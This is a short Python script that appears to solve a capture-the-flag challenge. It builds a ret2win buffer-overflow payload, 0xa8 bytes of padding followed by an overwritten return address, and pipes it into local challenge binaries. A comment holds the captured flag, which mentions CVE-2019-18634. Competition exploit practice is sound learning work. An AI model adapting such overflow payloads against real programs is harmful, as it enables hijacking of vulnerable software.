from os import system

data="a"*0xa8 +"\\x18\\x09\\x40\\x00\\x00\\x00\\x00\\x00"
print (data)
system(f"echo -e \"{data}\" | ./superez1")

cmd = f"echo -e \"{data}\" | script -f -c \"./superez\""
system(cmd)


print ("--- hec ---")
print (cmd)
#FwordCTF{CVE-2019-18634_Is_L33t_BuT_1SnT_It_E4Sy_Ret2Win?}
